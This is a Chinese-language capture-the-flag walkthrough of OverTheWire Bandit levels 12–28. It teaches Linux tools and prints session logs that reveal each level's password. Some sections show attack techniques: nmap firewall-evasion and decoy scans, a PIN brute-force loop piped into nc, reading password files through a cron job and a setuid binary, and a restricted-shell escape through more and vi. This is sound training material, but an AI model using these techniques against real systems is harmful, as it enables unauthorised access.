单字节八进制显示。-c 单字节字符显示。-d 双字节十进制显示。-o 双字节八进制显示。-x 双字节十六进制显示。-s 从偏移量开始输出。-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;。 每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a&gt;b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如： 1234%02d：两位十进制%03x：三位十六进制%02o：两位八进制%c：单个字符等 还有一些特殊的用法： 1234%_ad：标记下一个输出字节的序号，用十进制表示。%_ax：标记下一个输出字节的序号，用十六进制表示。%_ao：标记下一个输出字节的序号，用八进制表示。%_p：对不能以常规字符显示的用 . 代替。 同一行如果要显示多个格式字符串，则可以跟多个-e选项。 Demo: 1234hexdump -e &#x27;16/1 &quot;%02X &quot; &quot; | &quot;&#x27; -e &#x27;16/1 &quot;%_p&quot; &quot;\\n&quot;&#x27; test00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ................ 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F | ................ 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F | !&quot;#$%&amp;&#x27;()*+,-./ xxd xxd是二进制查看命令，默认将2文件显示为16进制字符串表示形式。 Usage: 1xxd [options] [infile [outfile]] or 1xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]] options: -a 缺省忽略转换: 使用‘*’替换空行. -b 二进数数据转储 (与 -ps,-i,-r不兼容). 默认为16进制. -c cols 每行多少列octets（特制8比特的字节）. 默认为16列(-i: 12, -ps: 30). -E 使用EBCDIC字符集. 默认为ASCII字符集. -e 小端模式转储 (与 -ps,-i,-r不兼容). -g 在正常输出中，每组八位字节数. 默认为2个 (-e: 4). -h 输出此帮助. -i 使用C语言文件样式输出. -r reverse operation: convert (or patch) hexdump into binary. bzip2、gzip： 解压压缩命令 Options： -d ：解压 -k：保留源文件 tar: tar可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 1tar(选项)(参数) options： 1234567891011121314151617181920212223-A或--catenate：新增文件到以存在的备份文件；-B：设置区块大小；-c或--create：建立新的备份文件；-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。-d：记录文件的差别；-x或--extract或--get：从备份文件中还原文件；-t或--list：列出备份文件的内容；-z或--gzip或--ungzip：通过gzip指令处理备份文件；-Z或--compress或--uncompress：通过compress指令处理备份文件；-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；-v或--verbose：显示指令执行过程；-r：添加文件到已经压缩的文件；-u：添加改变了和现有的文件到已经存在的压缩文件；-j：支持bzip2解压文件；-v：显示操作过程；-l：文件系统边界设置；-k：保留原有文件不覆盖；-m：保留文件不被覆盖；-w：确认压缩文件的正确性；-p或--same-permissions：用原来的文件权限还原文件；-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。 123456789bandit12@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r----- 1 bandit13 bandit12 2582 May 7 2020 data.txt-rw-r--r-- 1 root root 675 May 15 2017 .profile 查看data.txt文件后发现是二进制文件hexdump后的文件，但是该目录下我们并没有权限对该文件进行xxd操作 ls -al / root查看root目录下tmp文件我们具有权限 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253bandit12@bandit:~$ mkdir /tmp/what_a_fuckbandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txtbandit12@bandit:~$ cd /tmp/what_a_fuckbandit12@bandit:/tmp/what_a_fuck$ lsdata.txtbandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.binbandit12@bandit:/tmp/what_a_fuck$ lsdata.bin data.txtbandit12@bandit:/tmp/what_a_fuck$ file data.bindata.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf datadata5.binbandit12@bandit:/tmp/what_a_fuck$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data5.bin data6.binbandit12@bandit:/tmp/what_a_fuck$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data5.bin data.txt fuckbandit12@bandit:/tmp/what_a_fuck$ file fuckfuck: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuckdata8.binbandit12@bandit:/tmp/what_a_fuck$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz bandit12@bandit:/tmp/what_a_fuck$ file shitshit: ASCII textbandit12@bandit:/tmp/what_a_fuck$ cat shit The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level_13➡Level_14用所给密钥登录bandit14账号连接到主机即可 123456bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostbandit14@bandit:/etc$ cd /etc/bandit_passbandit14@bandit:/etc/bandit_pass$ cat bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level_14➡Level_15Man is a good command 🙂 Learn about ncNAME nc — arbitrary TCP and UDP connections and listens SYNOPSIS nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [-Z peercertfile] [destination] [port] DESCRIPTION The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Most used options -g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个; -G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数; -h：在线帮助; -i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口; -l：使用监听模式，监控传入的资料; -n：直接使用ip地址，而不通过域名服务器; -o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存; -p&lt;通信端口&gt;：设置本地主机使用的通信端口; -r：指定源端口和目的端口都进行随机的选择; -s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址; -u：使用UDP传输协议; -v：显示指令执行过程; -w&lt;超时秒数&gt;：设置等待连线的时间; -z：使用0输入/输出模式，只在扫描通信端口时使用。 1234bandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr Level_15➡Level_16Learn about openssl、s_client The s_client command implements a generic SSL/TLS client which connects to a remote host using SSL/TLS. It is a very useful diagnostic tool for SSL servers. man文档写的很详细。 直接连就行 openssl s_client -connect localhost:30001 输入本关flag即可 Level_16➡Level_17What’s nmap?Name nmap - Network exploration tool and security / port scanner Synopsis nmap [Scan Type…] [Options] {target specification} Options -sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。 -sS 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。 -sF -sN 秘密FIN数据包扫描、Xmas Tree、Null扫描模式 -sP ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。 -sU UDP扫描，但UDP扫描是不可靠的 -sA 这项高级的扫描方法通常用来穿过防火墙的规则集 -sV 探测端口服务版本 -Pn 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描 -v 显示扫描过程，推荐使用 -h 帮助选项，是最清楚的帮助文档 -p 指定端口，如“1-65535、1433、135、22、80”等 -O 启用远程操作系统检测，存在误报 -A 全面系统检测、启用脚本检测、扫描等 -oN/-oX/-oG 将报告写入文件，分别是正常、XML、grepable 三种格式 -T4 针对TCP端口禁止动态扫描延迟超过10ms -iL 读取主机列表，例如，“-iL C:\\ip.txt” 123456789101112131415161718192021222324252627282930nmap常用参数 nmap -A IP 最常规的nmap扫描nmap -sP IP 简单扫描（simple Ping）nmap -sS IP 用SYN进行扫描，会向目标发一个小的包nmap -sT IP 用TCP进行扫描，会向目标发一个小的包nmap -sU IP 用UDP进行扫描，会向目标发一个小的包nmap -sI IP1 IP2 用伪装的IP1地址去扫描目标IP2 nmap IP ; nmap -PE IP 常规的基于ICMP ping扫描nmap -PP IP 使用ICMP时间戳扫描，可以透墙nmap -PN IP IP如看似离线、宕机，尝试此参数，不用ICMP PING来进行扫描nmap -PS IP 使用TCP SYN 扫描，不用ICMPnmap -PA IP 使用TCP ACK 扫描，不用ICMPnmap -PU IP 使用UDP 扫描，不用ICMPnmap -p 端口号 IP 扫描某IP的某端口nmap -O IP 扫描目的IP设备，系统检测查看OS等信息 nmap -sU -sT -p U:53,T:25 172.20.6.69 扫描172.20.6.69 的tcp25口，udp的53口nmap –source-port 54 172.20.6.69 用指定的端口（如54）去扫描目标IP（172.20.6.69）nmap –data-length 25 172.20.6.69 发指定长度的包去探测目标IPnmap –randomize-hosts 172.20.6.69-100 随机遍历扫描172.20.6.69-100之间的IP nmap -D RND:10 172.20.6.69 —D 诱饵选项，设定n个随机虚假的地址去扫描目标地址172.20.6.69nmap -d 172.20.6.69 debug模式扫描目标IP,可以看到每一步的进度nmap –mtu 8 172.20.6.69 设置mtu为8 ，发很小的包给172.20.6.69进行扫描，能避免大多数的防火墙的阻拦，此值只要是8的倍数就行，如16，32,40.。。。nmap -F IP 快速扫描目标IP端口，也发送很小的包给目标地址，有点类似上条 –mtu 8 nmap -oN scan.txt 172.20.6.1/24 扫描172.20.6.0网段设备，结果输出至文件sanc.txt中nmap -oX scan.xml 172.20.6.1/24 扫描172.20.6.0网段设备，结果输出至文件sanc.xml中 1nmap -sV localhost -p 31000-32000 扫出来的几个端口不多一个个试即可 1bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof 输入本关密码即可得到下一关的密钥 Level_17➡Level_18用上一关private_key进行连接的时候注意一点，要用chmod改一下私钥权限 1chmod 777 rsa.priv Usage of diff1234567bandit17@bandit:~$ lspasswords.new passwords.oldbandit17@bandit:~$ diff passwords.old passwords.new42c42&lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii---&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Level_18➡Level_19连接到ssh后没有伪终端界面，但是我们依旧可以执行命令 12345678910111213141516ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org ls -alThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org&#x27;s password: total 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r----- 1 bandit19 bandit18 3549 May 7 2020 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rw-r----- 1 bandit19 bandit18 33 May 7 2020 readmeubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org cat readmeThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org&#x27;s password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x OR us Options: -T:禁止分配伪终端 虽然没有伪终端，但这时我们依旧可以使用shell Level_19➡Level_20Learn about chmod and setuid:chmod:(change mode）控制用户对文件的权限的命令 Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。 只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。 1chmod [-cfvR] [--help] [--version] mode file... Options: 1[ugoa...][[+-&#x3D;][rwxX]...][,...] u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。 + 表示增加权限、- 表示取消权限、= 表示唯一设定权限。 r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。 符号模式 使用符号模式可以设置多个项目：who（用户类型），operator（操作符）和 permission（权限），每个项目的设置可以用逗号隔开。 命令 chmod 将修改 who 指定的用户类型对文件的访问权限，用户类型由一个或者多个字母在 who 的位置来说明，如 who 的符号模式表所示: | who | 用户类型 | 说明 || —— | ———— | ——————————— || u | user | 文件所有者 || g | group | 文件所有者所在组 || o | others | 所有其他用户 || a | all | 所用用户, 相当于 ugo | operator 的符号模式表: Operator 说明 + 为指定的用户类型增加权限 - 去除指定用户类型的权限 = 设置指定用户权限的设置，即将用户类型的所有权限重新设置 permission 的符号模式表: 模式 名字 说明 r 读 设置为可读权限 w 写 设置为可写权限 x 执行权限 设置为可执行权限 X 特殊执行权限 只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行 s setuid/gid 当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限 t 粘贴位 设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位 八进制语法chmod命令可以使用八进制数来指定权限。文件或目录的权限位是由9个权限位来控制，每三位为一组，它们分别是文件所有者（User）的读、写、执行，用户组（Group）的读、写、执行以及其它用户（Other）的读、写、执行。历史上，文件权限被放在一个比特掩码中，掩码中指定的比特位设为1，用来说明一个类具有相应的优先级。 # 权限 rwx 二进制 7 读 + 写 + 执行 rwx 111 6 读 + 写 rw- 110 5 读 + 执行 r-x 101 4 只读 r— 100 3 写 + 执行 -wx 011 2 只写 -w- 010 1 只执行 —x 001 0 无 —- 000 Demo: chmod 765 所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。 用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。 其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。 Demo: 将文件 file1.txt 设为所有人皆可读取 : 1chmod ugo+r file1.txt 将文件 file1.txt 设为所有人皆可读取 : 1chmod a+r file1.txt 将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 : 1chmod ug+w,o-w file1.txt file2.txt 为 ex1.py 文件拥有者增加可执行权限: 1chmod u+x ex1.py 将目前目录下的所有文件与子目录皆设为任何人可读取 : 1chmod -R a+r * setuid: SUID 特殊权限仅适用于可执行文件，所具有的功能是，只要用户对设有 SUID 的文件有执行权限，那么当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失。 所以我们以bandit20身份cat flag即可 123456789bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ cat /etc/bandit_pass/bandit20cat: /etc/bandit_pass/bandit20: Permission deniedbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level_20➡Level_21其实就是开启多个shell窗口用nc在同一个端口下通信: Terminal 1 (host): 1234bandit20@melinda:~$ nc -nvlp 44444Listening on [0.0.0.0] (family 0, port 44444)GbKksEFF4yrVs6il55v6gwY5aVje5f0jgE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr &#x2F;&#x2F;get flag Terminal 2 (client): 12bandit20@melinda:~$ .&#x2F;suconnect 44444Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level_21➡Level_22Learn about crontab:crontab是一个可以根据时间、日期、月份、星期的组合调度对重复任务的执行的守护进程。 crontab文件中，每一行代表一个任务；每行有六列，每列代表一项设置，前五列为时间频率设定，第六列是要执行的任务。 1minute hour day mouth week command #分 时 日 月 周 命令 minute表示分钟，可以是0~59的任意整数。 hour表示小时，可以是2~23的任意整数 day表示日期，可以是1~31的任意整数 month表示月份，可以是1~12的任意整数 week表示星期几，可以是0~7之间的整数，0或者7表示星期天 command表示执行的命令 上面的设置除了数字之外还可以使用特殊字符： 星号*：表示所有可能的值，可以理解每隔。 逗号,：用逗号隔开的值表示一个列表范围，如1,2,3 每天每小时的第一、第二、第三分钟。 中杠-：用中杠隔开的值表示一个数值范围，如1-10 每天每小时的1到10分钟。 正斜线/：指定执行任务的间隔频率，如 0 10-18/2 *每天的十点到十八点间隔2小时执行。 Demo: 12345678910111213141516171819202122232425262728# 每分钟执行一次* * * * * # 每小时的第3和第15分钟执行3,15 * * * *#在上午的8点到11点的第3和第15分钟执行3,15 8-11 * * *#在每隔2天的上午8点和11点的第3和第15分钟执行3,15 8-11 */2 * *#每个星期一的上午8点到11点的第3和第15分钟执行3,15 8-11 * * 1#每晚的21：30执行30 21 * * *#每月1、10、22日的4:30执行30 4 1,10,22 * *#每周六、日1:10执行10 1 * * 6,7#每天18:00到23:00之间每隔30分钟执行0/30 18-23 * * *#星期六的23:00执行0 23 * * 6#每小时执行一次* */1 * * *#晚上11点到早上7点之间，每小时执行一次* 23-7/1 * * *#每月的4号与每周一到周三的11点0 11 4 * 1-3#一月一号的4点0 4 1 1 * Cron also offers some special strings, which can be used in place of the five time-and-date fields: | string | meaning || ————— | ——————————————— || @reboot | Run once, at startup. || @yearly | Run once a year, “0 0 1 1 “. || @annually | (same as @yearly) || @monthly | Run once a month, “0 0 1 “. || @weekly | Run once a week, “0 0 0”. || @daily | Run once a day, “0 0 “. || @midnight | (same as @daily) || @hourly | Run once an hour, “0 “. | 1234567891011121314151617181920bandit21@bandit:~$ cd /etc/cron.dbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat cronjob_bandit_bandit22cat: cronjob_bandit_bandit22: No such file or directorybandit21@bandit:/etc/cron.d$ cat cronjob_bandit_22cat: cronjob_bandit_22: No such file or directorybandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level_22➡Level_23Learn about md5sum and command cut:MD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest Algorithm 5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。 cut命令用于显示每行从开头算起 num1 到 num2 的文字。 cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。 如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 Options: -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。 -c ：以字符为单位进行分割。 -d ：自定义分隔符，默认为制表符。 -f ：与-d一起使用，指定显示哪个区域。 -n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的范围之内，该字符将被写出；否则，该字符将被排除 12345678910111213141516171819202122232425262728293031323334bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d &#x27; &#x27; -f 1)echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ whoamibandit22bandit22@bandit:/etc/cron.d$ ls -altotal 36drwxr-xr-x 2 root root 4096 Jul 11 2020 .drwxr-xr-x 87 root root 4096 May 14 2020 ..-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit15_root-rw-r--r-- 1 root root 62 Jul 11 2020 cronjob_bandit17_root-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22-rw-r--r-- 1 root root 122 May 7 2020 cronjob_bandit23-rw-r--r-- 1 root root 120 May 14 2020 cronjob_bandit24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit25_root-rw-r--r-- 1 root root 102 Oct 7 2017 .placeholderbandit22@bandit:/etc/cron.d$ echo I am user bandit23| md5sum8ca319486bfbbc3663ea0fbe81326349 -bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nbandit22@bandit:/etc/cron.d$ Descriptions: md5sum: 显示或检查 MD5(128-bit) 校验和,若没有文件选项，或者文件处为”-“，则从标准输入读取。echo -n : 不打印换行符。(注意: echo -n 后面的-n参数必须加上, 这样算出的字符串的md5值才正确)cut: cut用来从标准输入或文本文件中剪切列或域。剪切文本可以将之粘贴到一个文本文件。 -d 指定与空格和tab键不同的域分隔符。-f1 表示第一个域。 Level_23➡Level_24Ez_shell_code 123456789101112131415161718#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;for i in * .*;do if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ]; then echo &quot;Handling $i&quot; owner=&quot;$(stat --format &quot;%U&quot; ./$i)&quot; if [ &quot;$&#123;owner&#125;&quot; = &quot;bandit23&quot; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fidone Analyse: shell脚本分析： 间隔时间执行/var/spool/bandit24 目录下的文件然后删除 我们编写个shell脚本输出即可 12bandit23@bandit:/var/spool/bandit24$ vim fuck.shbandit23@bandit:/var/spool/bandit24$ chmod 777 fuck.sh fuck.sh 1cat /etc/bandit_pass/bandit24 &gt; /tmp/i_got_it 12bandit23@bandit:~$ cat /tmp/i_got_itUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level_24➡Level_25basic_shell 123456789#! /bin/bashpass24=&quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot;nc localhost 30002for i in &#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;do echo $pass24&#x27; &#x27;$i &gt;&gt; dictdonecat ./dict | nc localhost 30002 &gt;&gt; resort re | uniq -u Level_25➡Level_26Tips:The shell for user bandit26 is not /bin/bash 根据提示我们查看bandit26的/etc/passwd 文件 Learn about the passwd12345678910 passwd文件是以行为单位的配置文件，每行定义系统上的一个用户，行内分为字段，字段之间由一个冒号隔开。这些字段依次为：用户名：密码：用户ID：主要组ID：GECOS：主目录：登录shell字段解释：用户名：就是一个用户名，登录时候用的密码：在旧的UNIX系统上，这个字段含有用户的加密密码，为了安全性，现在的linux均显示为x或*号用户ID：linux内核用于识别用户的一个整数ID主要组ID：linux内核用于识别用户主要组的一个整数IDGECOS：用户全名，安装linux时如果不输入全名，则显示为跟用户名一样，如果输入，则显示为全名（不可用于登录）主目录：用户登录时，他的登录Shell将使用这个目录作为当前工作目录登录Shell：用户登录时的默认Shell，在redhat 企业版中，登录shell通常是&#x2F;bin&#x2F;bash Three types of users: 123456 3种类型的用户普通用户：普通用户是使用系统真实用户人群。普通用户通常把&#x2F;bin&#x2F;bash作为登录Shell和&#x2F;home的子目录作为主目录。一般情况下，普通用户只在自己的主目录和系统范围内的临时目录里（如&#x2F;tmp和&#x2F;var&#x2F;tmp）创建文件。在redhat企业版linux中，普通用户的用户ID数通常大于500. root用户：用户ID为0的用户，也被称为超级用户，root用户在系统上拥有完全权限，可以修改和删除任何文件，可以运行任何命令，可以取消任何进程。root用户负责增加和保留其他用户、配置硬件、添加系统软件。虽然root用户可以在系统上的任何地方创建文件，但它也通常使用&#x2F;root作为主目录 系统用户：大多数linux系统保留一系列低UID值用户作为系统用户，系统用户不代表人，而代表系统的组成部分。例如，运行Apache网络服务器的进程经常作为用户apache（ 见上面的passwd文件中apache用户信息）来运行。系统用户一般没有登录Shell，因为它不代表实际登录的用户。同样，系统用户的主目录很少在&#x2F;home中，而通常在属于相关应用的系统目录中。例如，用户apache的主目录是&#x2F;var&#x2F;www。在redhat企业版linux中，系统用户的UID值范围在1-499之间。 123456789bandit25@bandit:~$ cat /etc/passwd|grep bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit25@bandit:~$ cat /usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text.txtexit 0 将命令窗口调最小自动触发more，然后修改shell为bash即可 1234567# 按下v键进入vi编辑模式，然后更改shell为bash即可:set shell sh=/bin/bash #vim命令设置shell:sh #vim中执行shellbandit26@bandit:~$ cat /etc/bandit_pass/bandit265czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z Level_26➡Level_27和上一关差不多。 12:set shell=/bin/sh:sh 进入后: 12bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit273ba3118a22e93127a4ed485be72ef5ea Level_27➡Level_28Learn about Git参阅阮一峰这篇： clink_me git clone 克隆一个项目： 12345678bandit27@bandit:/tmp/what_a_fuck$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repobandit27@bandit:/tmp/what_a_fuck$ lsrepobandit27@bandit:/tmp/what_a_fuck$ cd repo/bandit27@bandit:/tmp/what_a_fuck/repo$ lsREADMEbandit27@bandit:/tmp/what_a_fuck/repo$ cat READMEThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 Level_28➡Level_29和上一关差不多，但并没有直接给flag，可以利用git log 命令查看修改信息： 123456789101112131415161718bandit28@bandit:/tmp/what_a_fuck/repo$ git logcommit edd935d60906b33f0619605abd1689808ccdd5eeAuthor: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 fix info leak #修复信息泄露commit c086d11a00c0648d095d04c089786efef5e01264Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 add missing data #添加缺少的信息commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 initial commit of README.md #最初的信息 很明显比较修复信息泄露的提交和上一个提交即可 1234567891011bandit28@bandit:/tmp/what_a_fuck/repo$ git diff c086 edd9diff --git a/README.md b/README.mdindex 3f7cee8..5c6457b 100644--- a/README.md+++ b/README.md@@ 